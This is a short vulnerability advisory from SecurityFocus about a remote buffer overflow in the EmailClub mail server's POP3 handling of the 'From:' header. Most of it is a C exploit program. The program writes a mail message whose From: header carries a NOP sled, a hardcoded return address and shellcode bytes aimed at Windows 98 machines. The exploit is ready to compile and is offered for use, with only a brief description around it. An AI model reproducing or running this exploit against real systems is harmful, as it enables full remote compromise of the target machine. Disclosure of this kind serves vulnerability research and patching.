source: http://www.securityfocus.com/bid/801/info


Certain versions of EmailClub, a mail server package by Admiral Systems Inc. are vulnerable to a remote buffer overflow. This overflow is exploitable via EmailClub's POP3 server which fails to perform proper bounds checking on the 'From:' header on incoming e-mail.

This overflow will lead to a complete compromise of the Windows 95/98 target machine. It may well also affect Windows NT installations in the same manner. It is unclear though if EmailClub run with ADMIN privileges under Windows NT installations.


/*=========================================================================
   E-MailClub Ver1.0.0.5 for Windows98J exploit
   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
   Written by UNYUN (shadowpenguin@backsection.net)
  =========================================================================
*/
#include <stdio.h>
#include <string.h>

#define HD1 \
"From exploit Wed Oct 27 01:53 JST 1999\n"\
"Date: Wed, 27 Oct 1999 01:53:00 +0900\n"

#define HD2 \
"Message-Id: <3815C9EBDC.E749HOGE@192.168.0.1>\n"\
"MIME-Version: 1.0\n"\
"Content-Transfer-Encoding: 7bit\n"\
"Content-Type: text/plain; charset=US-ASCII\n"\
"Content-Length: 1\n"\
"Status: U\n\n\n\n"

#define MAXBUF      2000
#define MAXBUF2     500
#define NOP         0x90
#define RETADR      511
#define EIP         0x7fc1415b

unsigned char exploit_code[100]={
0xb8,0x55,0x55,0x55,
0x55,0x50,0x50,0xB8,
0x96,0x91,0xFA,0x5F,
0x03,0xC0,0x50,0xc3,
};

main(int argc, char *argv[])
{
    FILE            *fp;
    char            buf[MAXBUF];
    unsigned int    ip;

    if (argc!=2){
        printf("usage: %s mailspool\n",argv[0]);
        exit(1);
    }
    if ((fp=fopen(argv[1],"wb"))==NULL){
        printf("Can not write to %s\n",argv[1]);
        exit(1);
    }
    memset(buf,NOP,MAXBUF);
    buf[MAXBUF-1]=0;

    ip=EIP;
    buf[RETADR-1]=0xa0;
    buf[RETADR  ]=ip&0xff;
    buf[RETADR+1]=(ip>>8)&0xff;
    buf[RETADR+2]=(ip>>16)&0xff;
    buf[RETADR+3]=(ip>>24)&0xff;
    strncpy(buf+RETADR+40,exploit_code,strlen(exploit_code));

    fprintf(fp,"%s",HD1);
    fprintf(fp,"From: %s <exploit@sample.code.net>\n",buf);
    fprintf(fp,"To: you@your.host.net\n");
    fprintf(fp,"Subject: subscribe exploit\n");
    fprintf(fp,"%s",HD2);
    fclose(fp);
}

